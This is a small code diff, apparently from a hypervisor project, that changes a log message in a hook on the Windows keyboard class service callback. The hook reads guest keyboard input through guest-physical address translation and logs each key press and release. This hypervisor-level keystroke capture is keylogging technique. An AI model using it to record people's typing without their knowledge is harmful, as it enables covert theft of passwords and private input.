@@ -123,7 +123,7 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
     for (; InputDataStart < InputDataEnd; InputDataStart++){
         data_phys = guest_virtual_to_physical(InputDataStart, __vmread(GUEST_CR3));
         if (data_phys->Flags == KEY_MAKE)
-            LOG_INFO("Key pressed %c\n", kbd_US[data_phys->MakeCode]);
+            LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
         else if (data_phys->Flags == KEY_BREAK)
             LOG_INFO("Key released: %c\n", kbd_US[data_phys->MakeCode]);
     }
